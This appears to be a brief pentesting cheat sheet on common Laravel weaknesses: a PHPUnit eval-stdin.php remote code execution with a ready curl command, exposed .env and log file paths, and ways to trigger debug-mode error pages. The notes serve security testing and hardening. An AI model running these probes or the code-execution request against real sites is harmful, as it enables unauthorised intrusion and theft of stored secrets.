# Common bug in laravel framework
1. Laravel PHPUnit Remote Code Execution
* Full Path Exploit : http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
* Affected versions : Before 4.8.28 and 5.x before 5.6.3

Command
```
curl -d "<?php echo php_uname(); ?>" http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

2. Exposed environment variables 
* Full Path Exploit : http://target.com/.env

![Environment Variables](https://1.bp.blogspot.com/-EUTxgP5XE6Q/XkgB4SyWSbI/AAAAAAAAAQA/eqtALOjLKKA46si-lIosm6cDVmxByjzIQCLcBGAsYHQ/s1600/1.png)

3. Exposed log files
* Full Path Exploit : http://target.com/storage/logs/laravel.log

4. Laravel Debug Mode Enabled
* Using SQL injection query in GET or POST method
* Try path /logout (ex:target.com/logout)
* Using [] in paramater (ex:target.com/param[]=0)

![Laravel Debug Mode](https://hacken.io/wp-content/uploads/2019/07/laravel-screen.png)

Source: [Nakanosec](https://www.nakanosec.com/2020/02/common-bug-pada-laravel.html)
